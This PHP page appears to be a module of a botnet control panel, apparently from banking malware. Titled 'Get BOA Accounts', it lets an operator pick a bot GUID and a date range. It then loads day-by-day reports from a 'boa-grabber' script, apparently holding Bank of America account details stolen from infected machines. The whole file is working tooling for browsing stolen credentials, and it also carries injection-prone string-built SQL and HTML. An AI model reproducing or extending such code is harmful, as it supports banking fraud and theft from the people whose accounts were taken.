<?php

require_once 'mod_dbase.php';
require_once 'config.php';

$dbase = db_open_byname('INFORMATION_SCHEMA');
if (!$dbase) exit;

$sql = ' SELECT MIN(TABLE_NAME)'
	 . '   FROM TABLES'
	 . " WHERE TABLES.TABLE_SCHEMA = '" . DB_NAME . "'"
	 . "   AND TABLES.TABLE_NAME LIKE 'rep2_2%'";
$res = mysqli_query($dbase, $sql);
$min = -1;
if ((@($res)) && mysqli_num_rows($res) > 0) {
	list($min) = mysqli_fetch_array($res);
	$min = substr($min, 5);
	$min_ = substr($min, 6, 2) . '/' . substr($min, 4, 2) . '/' . substr($min, 0, 4);
}

$sql = ' SELECT MAX(TABLE_NAME)'
	 . '   FROM TABLES'
	 . " WHERE TABLES.TABLE_SCHEMA = '" . DB_NAME . "'"
	 . "   AND TABLES.TABLE_NAME LIKE 'rep2_%'";
$res = mysqli_query($dbase, $sql);
$max = -1;
if ((@($res)) && mysqli_num_rows($res) > 0) {
	list($max) = mysqli_fetch_array($res);
	$max = substr($max, 5);
	$max_ = substr($max, 6, 2) . '/' . substr($max, 4, 2) . '/' . substr($max, 0, 4);
}

db_close($dbase);

?>

<!-- calendar -->
<link type="text/css" rel="stylesheet" href="js/JSCal2-1.7/src/css/jscal2.css" />
<link type="text/css" rel="stylesheet" href="js/JSCal2-1.7/src/css/border-radius.css" />
<link type="text/css" rel="stylesheet" href="js/JSCal2-1.7/src/css/reduce-spacing.css" />
<script src="js/JSCal2-1.7/src/js/jscal2.js"></script>
<script src="js/JSCal2-1.7/src/js/lang/en.js"></script>

<h2><b>Get BOA Accounts<font style="font-size: 50%;">&nbsp;&nbsp;&nbsp; v0.23</font></b></h2>

<form id='frm_findboa'>

<table width='100%' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);'>
<tr>
	<td width='150px' align='left'><b>Bot GUID :</b></td>
	<td align='left'><div>
<span style="margin-left:0px">
<!-- onFocus="javascript:
var options = {
		script:'frm_src_botguid.php?json=true&limit=6&',
		varname:'input',
		json:true,
		shownoresults:true,
		maxresults:16
		};
		var json=new AutoComplete('bot_guid',options); return true;" -->
<input style="width: 400px" type="text" id="bot_guid" name="bot_guid"  value="" />
</span>
</div></td>
</tr>
<tr>
	<td width='150px' align='left'><b>Report date region :</b></td>
	<td align='left'>
		<input id="boastart" name="boastart" style="width: 80px" value="<? echo $min_; ?>">
        <script type="text/javascript">
		new Calendar({
			inputField: "boastart",
			dateFormat: "%d/%m/%Y",
			trigger: "boastart",
			bottomBar: true,
			min: <? echo $min; ?>,
			max: <? echo $max; ?>
		});
		</script>
		...
		<input id="boaend" name="boaend" style="width: 80px" value="<? echo $max_; ?>">
        <script type="text/javascript">
        new Calendar({
			inputField: "boaend",
			dateFormat: "%d/%m/%Y",
			trigger: "boaend",
			bottomBar: true,
			min: <? echo $min; ?>,
			max: <? echo $max; ?>
			
		});
		</script>
		<input type='button' value='clean' onclick='document.getElementById("boastart").value = ""; document.getElementById("boaend").value = "";'>
	</td>
</tr>
<tr>
	<td width='150px' align='left'><b>Limit :</b></td>
	<td align='left'><input style="width: 50px" type="text" id="limit" name="limit" value="100"></td>
</tr>
<!--<tr>
	<td width='150px' align='left'><b>Show dates :</b></td>
	<td><input size='15' id='showDates' name='showDates' type='checkbox'></td>
</tr>-->
<tr>
	<td width='150px' colspan='2' align='center'><input type='button' value='submit' onclick='findboa(); return false;'></td>
</tr>
<table>

</form>


<script>
function ajax_findboa(num) {
	var fndel = document.getElementById('find' + num);
	if (!fndel)
		return false;
	fndel.onclick();
	return true;
}

function callback(body, i) {
	var rsltel = document.getElementById('sub_div_ajax_find' + i);
	rsltel.innerHTML = body;
	ajax_findboa(i + 1);
}
function findboa_fill(i, bot_guid, date, limit/*, showDates*/) {
	var dt = new Date();
	dt.setTime(date);
	
	var mm = '' + (dt.getMonth() + 1);
	if (mm.length == 1)
		mm = '0' + mm;
	var dd = '' + (dt.getDate());
	if (dd.length == 1)
		dd = '0' + dd;
	var dtstr = dt.getFullYear() + '' + mm + '' + dd;
	
	var pdata = ajax_getInputs("frm_findboa"); 
	ajax_pload("frm_boa-grabber_sub.php?bot_guid=" + encodeURI(bot_guid) + "&dt=" + dtstr + "&lm=" + limit/* + "&showDates=" + showDates*/, pdata, 'sub_div_ajax_find' + i, '<table><tr><td valign="center"><img border="0" src="img/ajax-loader(2).gif" alt="ajax-loader" title="Plz, wait a few sec."></td><td valign="center"><i> Loading ...</i></td></tr></table>', callback, i);
}

function findboa() {
	//
	var bot_guid = document.getElementById('bot_guid').value;
	//
	var dstart = document.getElementById('boastart').value;
	var fulldate = dstart.split('/');
	var day = fulldate[0];
	var month = fulldate[1];
	var year = fulldate[2];
	var datestart = new Date();
	datestart.setFullYear(year, month - 1, day);
	datestart.setHours(0, 0, 0, 0);
	// 
	var dfinish = document.getElementById('boaend').value;
	var fulldate = dfinish.split('/');
	var day = fulldate[0];
	var month = fulldate[1];
	var year = fulldate[2];
	var datefinish = new Date();
	datefinish.setFullYear(year, month - 1, day);
	datefinish.setHours(0, 0, 0, 0);
	// 
	var limit = document.getElementById('limit').value;
	if (!limit) limit = 0;
	//
	/* var showDates = document.getElementById('showDates').checked;
	if (!showDates) showDates = 0;
	else showDates = 1; */
	// 
	var job = document.getElementById('sub_div_ajax');
	var tmpHTML = '';
	for ( var i = 0 ; datestart.getTime() <= datefinish.getTime(); datestart.setHours(24, 0, 0, 0), i++ ) {
		 tmpHTML += "<table width='730' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #376D7C;'>";
		 tmpHTML += "<th style=' color: #EEEEEE;'>";
		 tmpHTML += '' + datestart.getDate() + '/' + (datestart.getMonth() + 1) + '/' + datestart.getFullYear() + '';
		 tmpHTML += '</th>';
		 tmpHTML += "<tr align='center' valign='middle' style=' background-color: #cce7ef; '>";
		 tmpHTML += '<td>';
		 tmpHTML += '<div id="sub_div_ajax_find' + i + '">';
		 tmpHTML += '<a id="find' + i + '" href="#null" onclick="findboa_fill(' + i + ', \'' + bot_guid + '\', ' + datestart.getTime() + ', ' + limit/* + ', ' + showDates*/ + '); return false;">';
		 tmpHTML += '<table><tr><td valign="center"><img border="0" src="img/ajax-loader(2).gif" alt="ajax-loader" title="Searching for BOA Accounts ... please, be cool"></td><td valign="center"></td></tr></table>';
		 tmpHTML += '</a>';
		 tmpHTML += '</div>';
		 tmpHTML += '</td>';
		 tmpHTML += '</tr>';
		 tmpHTML += "<tr style=' background-color: #e7f2f6; '>";
		 tmpHTML += "<td></td>";
		 tmpHTML += '</tr>';
		 tmpHTML += '</table>';
	}
	job.innerHTML = tmpHTML;
	
	ajax_findboa(0);
}
</script>

<hr size='1' color='#CCC'>

<div id='sub_div_ajax' align='center'>
</div>